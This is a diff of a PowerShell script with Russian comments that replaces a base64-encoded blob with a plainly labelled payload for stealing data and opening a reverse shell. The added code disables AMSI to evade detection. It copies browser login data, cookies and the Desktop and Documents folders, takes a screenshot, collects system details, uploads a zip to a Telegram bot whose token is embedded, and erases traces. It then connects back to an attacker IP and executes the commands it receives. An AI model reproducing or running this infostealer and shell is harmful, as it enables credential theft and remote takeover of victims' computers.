@@ -1,1 +1,111 @@
-JHRva2VuID0gIjg4NDczMDQyMjQ6QUFHSDhBeDZ0NDNWenM3UTdqbGpTQUhoN29HVVEyX0JuSzQiDQokY2hhdCA9ICIxODcwNDM1NDM4Ig0KDQokdG1wID0gIiRlbnY6VEVNUFxkYXRhXyQoR2V0LVJhbmRvbSkiDQpOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZSAtUGF0aCAkdG1wIHwgT3V0LU51bGwNCg0KZnVuY3Rpb24gR2V0LUJyb3dzZXJEYXRhIHsNCiAgICAkYnJvd3NlcnMgPSBAKA0KICAgICAgICBAe05hbWU9IkNocm9tZSI7IFBhdGg9IiRlbnY6TE9DQUxBUFBEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQifSwNCiAgICAgICAgQHtOYW1lPSJFZGdlIjsgICBQYXRoPSIkZW52OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcRGVmYXVsdCJ9DQogICAgKQ0KICAgIGZvcmVhY2ggKCRiIGluICRicm93c2Vycykgew0KICAgICAgICAkZGVzdCA9ICIkdG1wXCQoJGIuTmFtZSkiDQogICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRkZXN0IHwgT3V0LU51bGwNCiAgICAgICAgJGZpbGVzID0gQCgiTG9naW4gRGF0YSIsICJDb29raWVzIiwgIldlYiBEYXRhIikNCiAgICAgICAgZm9yZWFjaCAoJGYgaW4gJGZpbGVzKSB7DQogICAgICAgICAgICAkc3JjID0gIiQoJGIuUGF0aClcJGYiDQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRzcmMpIHsgQ29weS1JdGVtICRzcmMgJGRlc3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtRmlsZXMgew0KICAgICRmb2xkZXJzID0gQCgiJGVudjpVU0VSUFJPRklMRVxEZXNrdG9wIiwgIiRlbnY6VVNFUlBST0ZJTEVcRG9jdW1lbnRzIikNCiAgICBmb3JlYWNoICgkZm9sZGVyIGluICRmb2xkZXJzKSB7DQogICAgICAgICRkZXN0ID0gIiR0bXBcRmlsZXNfJChTcGxpdC1QYXRoICRmb2xkZXIgLUxlYWYpIg0KICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Gb3JjZSAtUGF0aCAkZGVzdCB8IE91dC1OdWxsDQogICAgICAgIENvcHktSXRlbSAiJGZvbGRlclwqIiAkZGVzdCAtUmVjdXJzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LVNjcmVlbnNob3Qgew0KICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nDQogICAgJHNjcmVlbiA9IFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5TY3JlZW5dOjpQcmltYXJ5U2NyZWVuLkJvdW5kcw0KICAgICRiaXRtYXAgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkJpdG1hcCAkc2NyZWVuLldpZHRoLCAkc2NyZWVuLkhlaWdodA0KICAgICRncmFwaGljcyA9IFtTeXN0ZW0uRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkYml0bWFwKQ0KICAgICRncmFwaGljcy5Db3B5RnJvbVNjcmVlbigkc2NyZWVuLlgsICRzY3JlZW4uWSwgMCwgMCwgJHNjcmVlbi5TaXplKQ0KICAgICRiaXRtYXAuU2F2ZSgiJHRtcFxzY3JlZW5zaG90LnBuZyIpDQogICAgJGdyYXBoaWNzLkRpc3Bvc2UoKTsgJGJpdG1hcC5EaXNwb3NlKCkNCn0NCg0KZnVuY3Rpb24gR2V0LVN5c3RlbUluZm8gew0KICAgICRpbmZvID0gIkhvc3Q6ICRlbnY6Q09NUFVURVJOQU1FYG5Vc2VyOiAkZW52OlVTRVJOQU1FYG4iDQogICAgJGluZm8gKz0gIklQOiAiICsgKEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHA6Ly9pZmNvbmZpZy5tZS9pcCIgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudC5UcmltKCkgKyAiYG4iDQogICAgJGluZm8gKz0gIk9TOiAiICsgKEdldC1XbWlPYmplY3QgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5DYXB0aW9uDQogICAgJGluZm8gfCBPdXQtRmlsZSAiJHRtcFxzeXN0ZW1faW5mby50eHQiDQp9DQoNCmZ1bmN0aW9uIFNlbmQtWmlwIHsNCiAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5JTy5Db21wcmVzc2lvbi5GaWxlU3lzdGVtDQogICAgJHppcCA9ICIkZW52OlRFTVBcZGF0YV8kKEdldC1SYW5kb20pLnppcCINCiAgICBbU3lzdGVtLklPLkNvbXByZXNzaW9uLlppcEZpbGVdOjpDcmVhdGVGcm9tRGlyZWN0b3J5KCR0bXAsICR6aXApDQogICAgJHVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmREb2N1bWVudCINCiAgICAkYm91bmRhcnkgPSAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJChbRGF0ZVRpbWVdOjpOb3cuVGlja3MuVG9TdHJpbmcoJ3gnKSkiDQogICAgJGJvZHkgPSAiLS0kYm91bmRhcnlgcmBuQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPWAiY2hhdF9pZGAiYHJgbmByYG4kY2hhdGByYG4iDQogICAgJGJvZHkgKz0gIi0tJGJvdW5kYXJ5YHJgbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1gImRvY3VtZW50YCI7IGZpbGVuYW1lPWAiZGF0YS56aXBgImByYG5Db250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3ppcGByYG5gcmBuIg0KICAgICRmaWxlQnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJHppcCkNCiAgICAkYm9keSArPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkZmlsZUJ5dGVzKQ0KICAgICRib2R5ICs9ICJgcmBuLS0kYm91bmRhcnktLSINCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLU1ldGhvZCBQb3N0IC1Db250ZW50VHlwZSAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JGJvdW5kYXJ5IiAtQm9keSAkYm9keSAtVXNlQmFzaWNQYXJzaW5nDQogICAgUmVtb3ZlLUl0ZW0gJHppcCAtRm9yY2UNCn0NCg0KdHJ5IHsNCiAgICBHZXQtQnJvd3NlckRhdGENCiAgICBHZXQtRmlsZXMNCiAgICBHZXQtU2NyZWVuc2hvdA0KICAgIEdldC1TeXN0ZW1JbmZvDQogICAgU2VuZC1aaXANCn0gY2F0Y2ggew0KICAgICRlcnIgPSAkXy5FeGNlcHRpb24uTWVzc2FnZQ0KICAgICR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR0b2tlbi9zZW5kTWVzc2FnZSINCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLU1ldGhvZCBQb3N0IC1Cb2R5IEB7Y2hhdF9pZD0kY2hhdDsgdGV4dD0iw5DFvsORy4bDkMK4w5DCscOQwrrDkMKwOiAkZXJyIn0gLVVzZUJhc2ljUGFyc2luZw0KfQ0KUmVtb3ZlLUl0ZW0gJHRtcCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU=
+# NetErrror Payload – сбор данных + reverse shell
+# Заполни свои параметры
+$botToken = "8847304224:AAGH8Ax6t43Vzs7Q7jljSAHh7oGUQ2_BnK4"
+$chatId = "1870435438"
+$attackerIP = "192.168.1.113"   # твой публичный IPv4
+$attackerPort = 4444             # любой свободный порт
+
+# Обход AMSI
+function Bypass-AMSI {
+    $a = [Ref].Assembly.GetTypes()
+    foreach ($t in $a) {
+        if ($t.Name -eq "AmsiUtils") {
+            $f = $t.GetFields('NonPublic,Static')
+            foreach ($fi in $f) {
+                if ($fi.Name -eq "amsiContext") {
+                    $fi.SetValue($null, $null)
+                }
+            }
+        }
+    }
+}
+Bypass-AMSI
+
+# ---- Сбор информации (как в предыдущем скрипте) ----
+$sysInfo = @{}
+$computer = Get-WmiObject Win32_ComputerSystem
+$os = Get-WmiObject Win32_OperatingSystem
+$ip = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.InterfaceAlias -notmatch "Loopback" -and $_.PrefixOrigin -ne "WellKnown" }).IPAddress -join ", "
+$sysInfo["ComputerName"] = $computer.Name
+$sysInfo["UserName"] = $env:USERNAME
+$sysInfo["IP"] = $ip
+$sysInfo["OS"] = $os.Caption + " " + $os.Version
+$installed = Get-WmiObject Win32_Product | Select Name, Version
+$sysInfo["Installed"] = $installed | Out-String
+
+# Скриншот
+Add-Type -AssemblyName System.Drawing
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+$screenshotPath = "$env:TEMP\screenshot.png"
+$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose(); $bitmap.Dispose()
+
+# Копирование файлов
+$tempDir = "$env:TEMP\NetErrrorData"
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+Copy-Item -Path "$([Environment]::GetFolderPath('Desktop'))\*" -Destination "$tempDir\Desktop" -Recurse -Force -ErrorAction SilentlyContinue
+Copy-Item -Path "$([Environment]::GetFolderPath('MyDocuments'))\*" -Destination "$tempDir\Documents" -Recurse -Force -ErrorAction SilentlyContinue
+
+# Браузеры
+$browserPaths = @{
+    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+    "Firefox"= "$env:APPDATA\Mozilla\Firefox\Profiles"
+}
+foreach ($b in $browserPaths.Keys) {
+    $p = $browserPaths[$b]
+    if (Test-Path $p) {
+        $d = "$tempDir\Browsers\$b"
+        New-Item -ItemType Directory -Path $d -Force | Out-Null
+        if ($b -eq "Firefox") {
+            Get-ChildItem $p -Directory | % { Copy-Item -Path "$($_.FullName)\*" -Destination "$d\$($_.Name)" -Recurse -Force -ErrorAction SilentlyContinue }
+        } else {
+            @("Login Data","Cookies","Web Data","Local State") | % { 
+                $s = "$p\$_"; if (Test-Path $s) { Copy-Item -Path $s -Destination "$d\" -Force -ErrorAction SilentlyContinue }
+            }
+        }
+    }
+}
+
+$sysInfo | Export-Clixml -Path "$tempDir\SystemInfo.xml"
+
+# ZIP
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+$zipPath = "$env:TEMP\data.zip"
+[System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+
+# Отправка в Telegram
+$url = "https://api.telegram.org/bot$botToken/sendDocument"
+$wc = New-Object System.Net.WebClient
+$boundary = "---------------------------" + (Get-Random -Max 99999999)
+$fileBytes = [IO.File]::ReadAllBytes($zipPath)
+$body = [Text.Encoding]::ASCII.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"data.zip`"`r`nContent-Type: application/zip`r`n`r`n") + $fileBytes + [Text.Encoding]::ASCII.GetBytes("`r`n--$boundary--`r`n")
+$wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+$wc.UploadData($url, "POST", $body) | Out-Null
+
+# Очистка
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+
+# ---- Reverse Shell (TCP) ----
+$client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$reader = New-Object System.IO.StreamReader($stream)
+$writer.WriteLine("[+] Connected to $env:COMPUTERNAME")
+$writer.Flush()
+while ($client.Connected) {
+    if ($stream.DataAvailable) {
+        $cmd = $reader.ReadLine()
+        if ($cmd -eq "exit") { break }
+        $output = iex $cmd 2>&1 | Out-String
+        $writer.WriteLine($output)
+        $writer.Flush()
+    }
+    Start-Sleep -Milliseconds 100
+}
+$client.Close()
